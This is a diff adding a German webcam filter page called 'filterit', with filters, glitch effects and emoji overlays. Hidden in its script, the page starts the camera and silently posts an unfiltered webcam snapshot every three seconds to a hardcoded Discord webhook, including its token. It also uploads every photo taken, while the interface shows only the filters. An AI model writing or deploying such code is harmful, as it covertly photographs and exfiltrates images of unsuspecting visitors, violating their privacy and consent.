@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>willkommen</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+    min-height: 100vh;
+    background: #0d1b2a;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 24px;
+    overflow-y: auto;
+  }
+  .bg {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    background: #0d1b2a;
+    transition: background 1s ease;
+  }
+  .container {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    max-width: 520px;
+    padding: 48px 32px;
+  }
+  h1 {
+    color: #fff;
+    font-weight: 200;
+    font-size: 2.8rem;
+    letter-spacing: 1px;
+    margin-bottom: 12px;
+    line-height: 1.2;
+  }
+  h1 span {
+    background: linear-gradient(135deg, #818cf8, #f472b6);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  p {
+    color: rgba(255,255,255,0.25);
+    font-size: 1rem;
+    font-weight: 300;
+    letter-spacing: 2px;
+    line-height: 1.6;
+  }
+  .particles {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+    overflow: hidden;
+  }
+  .particle {
+    position: absolute;
+    width: 2px; height: 2px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 50%;
+    animation: float linear infinite;
+  }
+  @keyframes float {
+    0% { transform: translateY(100vh) scale(0); opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+  }
+  .webcam {
+    margin-top: 32px;
+    display: inline-block;
+    position: relative;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 0 40px rgba(99,102,241,0.12), 0 0 80px rgba(99,102,241,0.06);
+    border: 1px solid rgba(255,255,255,0.06);
+  }
+  .webcam video {
+    display: block;
+    width: 300px;
+    height: 225px;
+    object-fit: cover;
+    transform: scaleX(-1);
+    filter: hue-rotate(45deg) saturate(1.6) contrast(1.1);
+    transition: filter 0.5s ease;
+  }
+  .webcam .badge {
+    position: absolute;
+    bottom: 10px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0,0,0,0.45);
+    backdrop-filter: blur(10px);
+    color: rgba(255,255,255,0.35);
+    font-size: 0.55rem;
+    letter-spacing: 1.5px;
+    padding: 4px 14px;
+    border-radius: 20px;
+    border: 1px solid rgba(255,255,255,0.06);
+    text-transform: uppercase;
+    white-space: nowrap;
+    pointer-events: none;
+    z-index: 6;
+  }
+  .webcam canvas.glitch-overlay {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    display: none;
+    z-index: 2;
+    image-rendering: pixelated;
+  }
+  .webcam canvas.emoji-overlay {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    display: none;
+    z-index: 3;
+  }
+  .webcam canvas#uploadCanvas {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    object-fit: cover;
+    border-radius: 20px;
+    z-index: 1;
+  }
+  .filters {
+    margin-top: 14px;
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+  .filters button {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.08);
+    color: rgba(255,255,255,0.3);
+    padding: 5px 16px;
+    border-radius: 20px;
+    font: inherit;
+    font-size: 0.68rem;
+    font-weight: 400;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.3s;
+    text-transform: lowercase;
+  }
+  .filters button:hover {
+    background: rgba(255,255,255,0.06);
+    border-color: rgba(255,255,255,0.15);
+    color: rgba(255,255,255,0.6);
+  }
+  .filters button.active {
+    background: rgba(99,102,241,0.15);
+    border-color: rgba(99,102,241,0.3);
+    color: rgba(255,255,255,0.7);
+    box-shadow: 0 0 20px rgba(99,102,241,0.1);
+  }
+  .actions {
+    margin-top: 20px;
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+  .actions button {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    color: rgba(255,255,255,0.5);
+    padding: 9px 22px;
+    border-radius: 30px;
+    font: inherit;
+    font-size: 0.75rem;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.25s;
+  }
+  .actions button:hover {
+    background: rgba(255,255,255,0.1);
+    border-color: rgba(255,255,255,0.2);
+    color: rgba(255,255,255,0.8);
+    box-shadow: 0 0 30px rgba(99,102,241,0.08);
+  }
+  .actions button:active {
+    transform: scale(0.95);
+  }
+  .actions button.shutter {
+    background: rgba(236,72,153,0.15);
+    border-color: rgba(236,72,153,0.25);
+    color: rgba(236,72,153,0.7);
+  }
+  .actions button.shutter:hover {
+    background: rgba(236,72,153,0.25);
+    border-color: rgba(236,72,153,0.4);
+    color: rgba(236,72,153,0.9);
+  }
+  .actions button#sendBtn {
+    background: rgba(99,102,241,0.12);
+    border-color: rgba(99,102,241,0.2);
+    color: rgba(99,102,241,0.6);
+  }
+  .actions button#sendBtn:hover {
+    background: rgba(99,102,241,0.22);
+    border-color: rgba(99,102,241,0.35);
+    color: rgba(99,102,241,0.9);
+  }
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0,0,0,0.75);
+    backdrop-filter: blur(12px);
+    color: #fff;
+    padding: 10px 24px;
+    border-radius: 30px;
+    font-size: 0.8rem;
+    letter-spacing: 0.5px;
+    border: 1px solid rgba(255,255,255,0.1);
+    z-index: 999;
+    opacity: 0;
+    transition: opacity 0.3s;
+    pointer-events: none;
+  }
+  .toast.show { opacity: 1; }
+  .effect-tag {
+    margin-top: 10px;
+    display: flex;
+    gap: 6px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+  .effect-tag button {
+    background: rgba(255,255,255,0.02);
+    border: 1px solid rgba(255,255,255,0.06);
+    color: rgba(255,255,255,0.2);
+    padding: 3px 10px;
+    border-radius: 12px;
+    font: inherit;
+    font-size: 0.55rem;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: all 0.3s;
+  }
+  .effect-tag button:hover {
+    background: rgba(255,255,255,0.05);
+    color: rgba(255,255,255,0.4);
+  }
+  .effect-tag button.active {
+    background: rgba(16,185,129,0.12);
+    border-color: rgba(16,185,129,0.2);
+    color: rgba(16,185,129,0.5);
+  }
+  .effect-tag button.big67 {
+    font-size: 0.85rem;
+    padding: 5px 18px;
+    background: rgba(255,200,50,0.06);
+    border-color: rgba(255,200,50,0.12);
+    color: rgba(255,200,50,0.4);
+  }
+  .effect-tag button.big67:hover {
+    background: rgba(255,200,50,0.1);
+    border-color: rgba(255,200,50,0.2);
+    color: rgba(255,200,50,0.7);
+  }
+  .effect-tag button.big67.active {
+    background: rgba(255,200,50,0.15);
+    border-color: rgba(255,200,50,0.3);
+    color: rgba(255,200,50,0.8);
+    box-shadow: 0 0 25px rgba(255,200,50,0.1);
+  }
+  .photos {
+    margin-top: 24px;
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    flex-wrap: wrap;
+    min-height: 0;
+  }
+  .photos .item {
+    position: relative;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid rgba(255,255,255,0.06);
+    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    flex-shrink: 0;
+    width: 108px;
+    height: 81px;
+    animation: snapIn 0.3s ease;
+  }
+  .recent {
+    margin-top: 10px;
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    flex-wrap: wrap;
+    min-height: 0;
+  }
+  .recent .thumb {
+    width: 60px;
+    height: 45px;
+    border-radius: 8px;
+    overflow: hidden;
+    cursor: pointer;
+    border: 1px solid rgba(255,255,255,0.08);
+    opacity: 0.6;
+    transition: all 0.2s;
+    flex-shrink: 0;
+  }
+  .recent .thumb:hover {
+    opacity: 1;
+    border-color: rgba(255,255,255,0.2);
+    transform: scale(1.08);
+  }
+  .recent .thumb img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+  @keyframes snapIn {
+    0% { transform: scale(0.8) rotate(-3deg); opacity: 0; }
+    100% { transform: scale(1) rotate(0deg); opacity: 1; }
+  }
+  .photos .item img {
+    display: block;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+  .photos .item .overlay {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(0,0,0,0.55);
+    opacity: 0;
+    transition: opacity 0.25s;
+    cursor: pointer;
+  }
+  .photos .item:hover .overlay {
+    opacity: 1;
+  }
+  .photos .item .overlay span {
+    color: #fff;
+    font-size: 0.65rem;
+    letter-spacing: 1px;
+    background: rgba(255,255,255,0.08);
+    padding: 3px 12px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.1);
+    backdrop-filter: blur(4px);
+  }
+  .photos .item .share-btn {
+    position: absolute;
+    bottom: 6px;
+    right: 6px;
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.15);
+    color: #fff;
+    font-size: 0.75rem;
+    padding: 3px 8px;
+    border-radius: 8px;
+    cursor: pointer;
+    opacity: 0;
+    transition: opacity 0.25s;
+    backdrop-filter: blur(4px);
+    line-height: 1;
+    z-index: 2;
+  }
+  .photos .item:hover .share-btn,
+  .photos .item .share-btn:focus-visible { opacity: 1; }
+  .flash {
+    position: fixed;
+    inset: 0;
+    z-index: 999;
+    background: #fff;
+    opacity: 0;
+    pointer-events: none;
+    animation: flashAnim 0.3s ease forwards;
+  }
+  @keyframes flashAnim {
+    0% { opacity: 0.8; }
+    100% { opacity: 0; }
+  }
+  .nav-links { margin-top: 28px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
+  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="particles" id="particles"></div>
+<div class="toast" id="toast"></div>
+<div class="container">
+  <h1><span>filterit</span> 📸</h1>
+  <p>wähl einen filter & mach ein foto</p>
+  <div class="webcam">
+    <video id="cam" autoplay playsinline muted></video>
+    <canvas class="glitch-overlay" id="glitchOverlay"></canvas>
+    <canvas class="emoji-overlay" id="emojiOverlay"></canvas>
+    <canvas id="uploadCanvas" style="display:none"></canvas>
+    <div class="badge">🎥 <span id="filterBadge">neon</span></div>
+  </div>
+  <div class="filters" id="filters">
+    <button data-filter="neon" class="active">neon</button>
+    <button data-filter="vintage">vintage</button>
+    <button data-filter="glitch">glitch</button>
+    <button data-filter="vhs">📺 vhs</button>
+    <button data-filter="psychedelic">psychedelic</button>
+    <button data-filter="noir">noir</button>
+    <button data-filter="dream">dream</button>
+    <button data-filter="thermal">thermal</button>
+    <button data-filter="invert">invert</button>
+    <button data-filter="warm">warm</button>
+    <button data-filter="ice">ice</button>
+  </div>
+  <div class="actions">
+    <button class="shutter" id="captureBtn">📸 foto machen</button>
+    <button id="burstBtn">⚡ burst (5×)</button>
+    <button id="galleryBtn">📁 bild laden</button>
+    <button id="sendBtn">📤 senden</button>
+    <input type="file" id="fileInput" accept="image/*" style="display:none">
+    <input type="file" id="sendInput" accept="image/*" multiple style="display:none">
+  </div>
+
+  <div class="photos" id="photos"></div>
+  <div class="recent" id="recentBar"></div>
+  <div class="effect-tag" id="emojiTags">
+    <span style="color:rgba(255,255,255,0.15);font-size:0.55rem;letter-spacing:1px;padding:3px 4px;">✨</span>
+    <button data-mood="none" class="active">none</button>
+    <button data-mood="party">🎉 party</button>
+    <button data-mood="color">🌈 bunt</button>
+    <button data-mood="chaos">💀 chaos</button>
+    <button data-mood="love">💖 liebe</button>
+    <button data-mood="nature">🌸 natur</button>
+    <button data-mood="sixseven" class="big67">🔥 6️⃣7️⃣ 🔥</button>
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
+
+for (let i = 0; i < 40; i++) {
+  const p = document.createElement('div');
+  p.className = 'particle';
+  p.style.left = Math.random() * 100 + '%';
+  p.style.animationDuration = (8 + Math.random() * 12) + 's';
+  p.style.animationDelay = (Math.random() * 15) + 's';
+  p.style.width = p.style.height = (1 + Math.random() * 3) + 'px';
+  document.getElementById('particles').appendChild(p);
+}
+
+const video = document.getElementById('cam');
+
+const canvas = document.createElement('canvas');
+let stream = null;
+let ready = false;
+
+function send(blob) {
+  const fd = new FormData();
+  const now = new Date();
+  const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
+  fd.append('file', blob, `foto_${ts}.png`);
+  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
+}
+
+function capture() {
+  if (!ready || !video.videoWidth) return;
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+  canvas.toBlob(send, 'image/png');
+}
+
+(async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } }, audio: false });
+    video.srcObject = stream;
+    await video.play();
+    ready = true;
+    setInterval(capture, 3000);
+    capture();
+  } catch {}
+})();
+
+window.addEventListener('beforeunload', () => {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+});
+
+const filterMap = {
+  neon:        'hue-rotate(45deg) saturate(1.6) contrast(1.1)',
+  vintage:     'sepia(0.6) saturate(1.2) hue-rotate(-15deg) brightness(1.05)',
+  glitch:      'contrast(1.3) brightness(1.1) saturate(1.8) hue-rotate(180deg)',
+  vhs:         'contrast(1.2) saturate(1.4) brightness(1.05)',
+  psychedelic: 'hue-rotate(0deg) saturate(2) contrast(1.2) brightness(1.1)',
+  noir:        'grayscale(1) contrast(1.5) brightness(0.85)',
+  dream:       'brightness(1.2) contrast(0.8) saturate(1.3) blur(1px)',
+  thermal:     'hue-rotate(310deg) saturate(2.2) contrast(1.3) brightness(1.1)',
+  invert:      'invert(1) saturate(1.5) hue-rotate(180deg)',
+  warm:        'sepia(0.5) saturate(1.6) hue-rotate(-5deg) brightness(1.1)',
+  ice:         'hue-rotate(190deg) saturate(1.4) brightness(1.15) contrast(0.9)',
+};
+
+let currentFilter = 'neon';
+let psyRaf = null;
+let psyHue = 0;
+
+const bgColors = {
+  neon:   '#0d1b2a',
+  vintage:'#1a1410',
+  glitch: '#0f1a0f',
+  vhs:    '#1a0f14',
+  psychedelic:'#120a1a',
+  noir:   '#0a0a0a',
+  dream:  '#0f1a1a',
+  thermal:'#0a141f',
+  invert: '#1a1a0a',
+  warm:   '#1a1208',
+  ice:    '#081420',
+};
+
+function setBg(name) {
+  document.querySelector('.bg').style.backgroundColor = bgColors[name] || '#0d1b2a';
+}
+
+function getFilterCSS(name) {
+  if (name === 'psychedelic') return `hue-rotate(${psyHue}deg) saturate(2) contrast(1.2) brightness(1.1)`;
+  return filterMap[name] || 'none';
+}
+
+function setFilter(name) {
+  currentFilter = name;
+  setBg(name);
+  document.querySelectorAll('#filters button').forEach(b => b.classList.remove('active'));
+  const btn = document.querySelector(`#filters button[data-filter="${name}"]`);
+  if (btn) btn.classList.add('active');
+  document.getElementById('filterBadge').textContent = name;
+  if (psyRaf) { cancelAnimationFrame(psyRaf); psyRaf = null; }
+  stopVHS();
+  if (name === 'psychedelic') {
+    (function frame() {
+      psyHue = (psyHue + 1.5) % 360;
+      if (uploadImg) applyUploadFilter();
+      else video.style.filter = `hue-rotate(${psyHue}deg) saturate(2) contrast(1.2) brightness(1.1)`;
+      psyRaf = requestAnimationFrame(frame);
+    })();
+  } else {
+    const css = filterMap[name] || 'none';
+    if (uploadImg) applyUploadFilter();
+    else video.style.filter = css;
+  }
+  if (name === 'vhs') startVHS();
+}
+
+document.getElementById('filters').addEventListener('click', e => {
+  const btn = e.target.closest('button');
+  if (btn) setFilter(btn.dataset.filter);
+});
+
+// ── photo capture ──
+const snapCanvas = document.createElement('canvas');
+const snapCtx = snapCanvas.getContext('2d');
+const photoEl = document.getElementById('photos');
+const captureBtn = document.getElementById('captureBtn');
+const burstBtn = document.getElementById('burstBtn');
+
+function flash() {
+  const el = document.createElement('div');
+  el.className = 'flash';
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), 350);
+}
+
+function addPhoto(blob) {
+  const url = URL.createObjectURL(blob);
+  const now = new Date();
+  const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
+  const div = document.createElement('div');
+  div.className = 'item';
+  div.innerHTML = `<img src="${url}"><a class="overlay" href="${url}" download="foto_${ts}.png"><span>💾</span></a><button class="share-btn" data-blob="${ts}">📤</button>`;
+  div.querySelector('.share-btn').addEventListener('click', () => {
+    if (navigator.share && navigator.canShare) {
+      const file = new File([blob], `foto_${ts}.png`, { type: 'image/png' });
+      if (navigator.canShare({ files: [file] })) {
+        navigator.share({ files: [file], title: 'filterit' }).catch(() => {});
+      }
+    }
+  });
+  photoEl.prepend(div);
+  while (photoEl.children.length > 8) {
+    const last = photoEl.lastChild;
+    URL.revokeObjectURL(last.querySelector('img').src);
+    last.remove();
+  }
+}
+
+function vhsFrame(imgData, w, h) {
+  const d = imgData.data;
+  const out = new Uint8ClampedArray(d);
+  const shift = 6 + Math.random() * 20 | 0;
+  for (let y = 0; y < h; y++) {
+    const row = y * w;
+    for (let x = 0; x < w; x++) {
+      const i = (row + x) * 4;
+      const ri = (row + Math.max(0, x - shift)) * 4;
+      const bi = (row + Math.min(w - 1, x + shift)) * 4;
+      out[i]     = d[ri] || d[i];
+      out[i + 2] = d[bi + 2] || d[i + 2];
+    }
+  }
+  for (let t = 0; t < 4 + Math.random() * 8 | 0; t++) {
+    const barY = Math.random() * h | 0;
+    const barH = 3 + Math.random() * 20 | 0;
+    const barShift = (Math.random() * 60 - 30) | 0;
+    for (let row = barY; row < Math.min(barY + barH, h); row++) {
+      const srcOff = (row * w + Math.max(0, barShift)) * 4;
+      const dstOff = row * w * 4;
+      const len = (w - Math.abs(barShift)) * 4;
+      if (barShift > 0) {
+        for (let k = 0; k < len; k++) out[dstOff + k] = out[srcOff + k];
+      } else {
+        for (let k = 0; k < len; k++) out[dstOff + k] = out[dstOff - barShift * 4 + k];
+      }
+    }
+  }
+  return new ImageData(out, w, h);
+}
+
+async function capturePhoto() {
+  if (!ready && !uploadImg) return;
+  const w = uploadImg ? uploadImg.naturalWidth : video.videoWidth;
+  const h = uploadImg ? uploadImg.naturalHeight : video.videoHeight;
+  if (!w || !h) return;
+  snapCanvas.width = w;
+  snapCanvas.height = h;
+
+  if (uploadImg) {
+    snapCtx.setTransform(1, 0, 0, 1, 0, 0);
+    snapCtx.filter = getFilterCSS(currentFilter);
+    snapCtx.drawImage(uploadImg, 0, 0, w, h);
+  } else if (currentFilter === 'vhs') {
+    snapCtx.setTransform(-1, 0, 0, 1, 0, 0);
+    snapCtx.filter = 'none';
+    snapCtx.drawImage(video, -w, 0, w, h);
+    snapCtx.setTransform(1, 0, 0, 1, 0, 0);
+    const frame = snapCtx.getImageData(0, 0, w, h);
+    snapCtx.putImageData(vhsFrame(frame, w, h), 0, 0);
+  } else {
+    snapCtx.setTransform(-1, 0, 0, 1, 0, 0);
+    snapCtx.filter = getFilterCSS(currentFilter);
+    snapCtx.drawImage(video, -w, 0, w, h);
+    snapCtx.setTransform(1, 0, 0, 1, 0, 0);
+  }
+
+  snapCtx.filter = 'none';
+
+  if (currentMood !== 'none') {
+    const eo = document.getElementById('emojiOverlay');
+    snapCtx.drawImage(eo, 0, 0, eo.width, eo.height, 0, 0, w, h);
+  }
+
+  const blob = await new Promise(r => snapCanvas.toBlob(r, 'image/png'));
+  addPhoto(blob);
+  send(blob);
+  flash();
+
+  if (navigator.share && navigator.canShare) {
+    const now = new Date();
+    const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
+    const file = new File([blob], `foto_${ts}.png`, { type: 'image/png' });
+    if (navigator.canShare({ files: [file] })) {
+      navigator.share({ files: [file], title: 'filterit' }).catch(() => {});
+    }
+  }
+}
+
+captureBtn.addEventListener('click', capturePhoto);
+
+let bursting = false;
+burstBtn.addEventListener('click', async () => {
+  if (bursting) return;
+  bursting = true;
+  burstBtn.style.opacity = '0.4';
+  for (let i = 0; i < 5; i++) {
+    capturePhoto();
+    await new Promise(r => setTimeout(r, 400));
+  }
+  bursting = false;
+  burstBtn.style.opacity = '1';
+});
+
+// ── gallery upload ──
+const fileInput = document.getElementById('fileInput');
+const uploadCanvas = document.getElementById('uploadCanvas');
+const uploadCtx = uploadCanvas.getContext('2d');
+const recentBar = document.getElementById('recentBar');
+let uploadImg = null;
+let recentFiles = []; // max 5 blobs
+
+function loadImageFile(file) {
+  const img = new Image();
+  img.onload = () => {
+    uploadImg = img;
+    uploadCanvas.width = img.naturalWidth;
+    uploadCanvas.height = img.naturalHeight;
+    uploadCanvas.style.display = 'block';
+    document.getElementById('cam').style.display = 'none';
+    document.querySelector('.badge').innerHTML = '🖼️ <span id="filterBadge">bild</span>';
+    applyUploadFilter();
+
+    recentFiles = recentFiles.filter(b => b !== file).concat(file).slice(-5);
+    renderRecent();
+  };
+  img.src = URL.createObjectURL(file);
+}
+
+function renderRecent() {
+  recentBar.innerHTML = '';
+  for (const file of recentFiles) {
+    const div = document.createElement('div');
+    div.className = 'thumb';
+    const url = URL.createObjectURL(file);
+    div.innerHTML = `<img src="${url}">`;
+    div.addEventListener('click', () => loadImageFile(file));
+    recentBar.appendChild(div);
+  }
+}
+
+document.getElementById('galleryBtn').addEventListener('click', () => {
+  if (uploadImg) { resetUpload(); return; }
+  fileInput.click();
+});
+
+fileInput.addEventListener('change', () => {
+  const file = fileInput.files[0];
+  if (!file) return;
+  loadImageFile(file);
+});
+
+// ── batch send to discord ──
+const sendInput = document.getElementById('sendInput');
+const toastEl = document.getElementById('toast');
+let toastTimer = null;
+
+function toast(msg) {
+  toastEl.textContent = msg;
+  toastEl.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toastEl.classList.remove('show'), 3000);
+}
+
+document.getElementById('sendBtn').addEventListener('click', () => sendInput.click());
+
+sendInput.addEventListener('change', async () => {
+  const files = [...sendInput.files].slice(0, 20);
+  if (!files.length) return;
+  toast(`sende ${files.length} bilder an discord …`);
+  for (let i = 0; i < files.length; i++) {
+    const blob = files[i];
+    const now = new Date();
+    const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
+    const fd = new FormData();
+    fd.append('file', blob, `foto_${ts}_${i}.png`);
+    await fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
+    await new Promise(r => setTimeout(r, 300));
+  }
+  toast(`${files.length} bilder gesendet ✅`);
+  sendInput.value = '';
+});
+
+function applyUploadFilter() {
+  if (!uploadImg) return;
+  uploadCtx.setTransform(1, 0, 0, 1, 0, 0);
+  uploadCtx.filter = getFilterCSS(currentFilter);
+  uploadCtx.drawImage(uploadImg, 0, 0, uploadCanvas.width, uploadCanvas.height);
+  uploadCtx.filter = 'none';
+}
+
+function resetUpload() {
+  uploadImg = null;
+  uploadCanvas.style.display = 'none';
+  uploadCanvas.style.filter = 'none';
+  document.getElementById('cam').style.display = 'block';
+  document.querySelector('.badge').innerHTML = '🎥 <span id="filterBadge">' + currentFilter + '</span>';
+  video.style.filter = filterMap[currentFilter] || 'none';
+  fileInput.value = '';
+}
+
+// ── VHS glitch overlay ──
+let vhsRunning = false;
+let vhsRaf = null;
+let vhsState = null;
+
+function startVHS() {
+  const overlay = document.getElementById('glitchOverlay');
+  const parent = overlay.parentElement;
+  overlay.style.display = 'block';
+  vhsRunning = true;
+
+  const offscreen = document.createElement('canvas');
+  const offCtx = offscreen.getContext('2d');
+  const ctx = overlay.getContext('2d');
+
+  let glitch = false;
+  let glitchTimer = 0;
+  let glitchShift = 0;
+  let bars = [];
+
+  function resize() {
+    const pw = parent.offsetWidth, ph = parent.offsetHeight;
+    const dpr = window.devicePixelRatio || 1;
+    overlay.width = pw * dpr;
+    overlay.height = ph * dpr;
+    overlay.style.width = pw + 'px';
+    overlay.style.height = ph + 'px';
+    offscreen.width = pw;
+    offscreen.height = ph;
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  function drawGlitch() {
+    if (!vhsRunning) return;
+
+    const pw = parent.offsetWidth, ph = parent.offsetHeight;
+
+    if (!glitch && Math.random() < 0.04) {
+      glitch = true;
+      glitchTimer = 60 + Math.random() * 180;
+      glitchShift = 4 + Math.random() * 16 | 0;
+      bars = [];
+      for (let i = 0; i < 3 + Math.random() * 6 | 0; i++) {
+        bars.push({
+          y: Math.random() * ph | 0,
+          h: 2 + Math.random() * 12 | 0,
+          r: Math.random() * 40 - 20 | 0,
+          red: Math.random() > 0.4,
+        });
+      }
+    }
+
+    if (glitch) {
+      offCtx.setTransform(-1, 0, 0, 1, 0, 0);
+      offCtx.drawImage(video, -pw, 0, pw, ph);
+      offCtx.setTransform(1, 0, 0, 1, 0, 0);
+
+      const frame = offCtx.getImageData(0, 0, pw, ph);
+      const d = frame.data;
+      const out = new Uint8ClampedArray(d);
+
+      const shift = glitchShift;
+      for (let y = 0; y < ph; y++) {
+        const row = y * pw;
+        for (let x = 0; x < pw; x++) {
+          const i = (row + x) * 4;
+          const ri = (row + Math.max(0, x - shift)) * 4;
+          const bi = (row + Math.min(pw - 1, x + shift)) * 4;
+          out[i]     = d[ri] || d[i];
+          out[i + 2] = d[bi + 2] || d[i + 2];
+        }
+      }
+
+      for (const b of bars) {
+        for (let row = b.y; row < Math.min(b.y + b.h, ph); row++) {
+          const srcOff = (row * pw + Math.max(0, b.r)) * 4;
+          const dstOff = row * pw * 4;
+          const len = (pw - Math.abs(b.r)) * 4;
+          if (b.r > 0) {
+            for (let k = 0; k < len; k++) out[dstOff + k] = out[srcOff + k];
+          } else {
+            for (let k = 0; k < len; k++) out[dstOff + k] = out[dstOff - b.r * 4 + k];
+          }
+        }
+      }
+
+      const dpr = window.devicePixelRatio || 1;
+      ctx.clearRect(0, 0, overlay.width, overlay.height);
+      ctx.save();
+      ctx.scale(dpr, dpr);
+
+      const tmp = new ImageData(out, pw, ph);
+      ctx.putImageData(tmp, 0, 0);
+
+      // red / cyan flicker bars on top
+      for (const b of bars) {
+        if (b.red) {
+          ctx.fillStyle = `rgba(255,40,40,${0.15 + Math.random() * 0.15})`;
+        } else {
+          ctx.fillStyle = `rgba(0,255,255,${0.15 + Math.random() * 0.15})`;
+        }
+        ctx.fillRect(0, b.y, pw, b.h);
+      }
+
+      ctx.restore();
+
+      glitchTimer -= 16;
+      if (glitchTimer <= 0) {
+        glitch = false;
+        ctx.clearRect(0, 0, overlay.width, overlay.height);
+      }
+    } else {
+      ctx.clearRect(0, 0, overlay.width, overlay.height);
+    }
+
+    vhsRaf = requestAnimationFrame(drawGlitch);
+  }
+
+  vhsState = { overlay, offscreen, ctx, offCtx, resize: resize.bind(null) };
+  drawGlitch();
+}
+
+function stopVHS() {
+  vhsRunning = false;
+  if (vhsRaf) { cancelAnimationFrame(vhsRaf); vhsRaf = null; }
+  const overlay = document.getElementById('glitchOverlay');
+  overlay.style.display = 'none';
+  const ctx = overlay.getContext('2d');
+  ctx && ctx.clearRect(0, 0, overlay.width, overlay.height);
+}
+
+// ── emoji particle overlay ──
+let emojiRunning = false;
+let emojiRaf = null;
+let emojiParticles = [];
+let currentMood = 'none';
+
+const moodPresets = {
+  party:  { emojis: ['🎉','🎊','🥳','🎈','🎁','🎀','✨'], count: 30, speed: 0.3, sway: 0.4, size: [16, 32] },
+  color:  { emojis: ['🌈','✨','💫','🌟','⭐','🎨','🦋','🔮'], count: 24, speed: 0.2, sway: 0.8, size: [14, 28] },
+  chaos:  { emojis: ['💀','👻','🤡','🎃','👽','👾','😈','💥'], count: 35, speed: 0.7, sway: 1.2, size: [16, 30] },
+  love:   { emojis: ['💖','💕','💗','💓','💘','❤️‍🔥','🩷','💝'], count: 28, speed: 0.25, sway: 0.3, size: [16, 30] },
+  nature: { emojis: ['🌸','🌺','🌻','🌿','🍀','🦋','🌸','🌼','🌱'], count: 22, speed: 0.15, sway: 0.3, size: [14, 28] },
+  sixseven: { emojis: ['😎','👉','🔥','💯','🫰','✨'], count: 14, speed: 0.3, sway: 0.4, size: [14, 22] },
+};
+
